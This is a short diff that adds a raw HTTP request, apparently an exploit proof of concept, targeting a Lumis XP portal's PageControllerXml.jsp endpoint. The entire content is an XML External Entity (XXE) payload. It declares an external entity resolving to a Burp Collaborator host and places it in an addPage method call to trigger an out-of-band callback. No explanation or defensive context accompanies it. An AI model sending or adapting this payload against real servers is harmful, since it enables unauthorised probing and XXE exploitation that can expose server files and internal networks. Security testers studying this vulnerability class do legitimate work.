@@ -1,0 +1,13 @@
+POST /lumis/portal/controller/xml/PageControllerXml.jsp HTTP/1.1
+Host: lumisxp.lumis.com.br
+Content-Length: 197
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+Accept-Encoding: gzip, deflate
+<?xml version="1.0" ?>
+<!DOCTYPE r [
+<!ELEMENT r ANY >
+<!ENTITY xxe SYSTEM "http://424enn3ma642re6wx9zs0rf6nxtnhc.burpcollaborator.net">
+]>
+<method name="addPage">
+<id>&xxe;</id>
+</method>
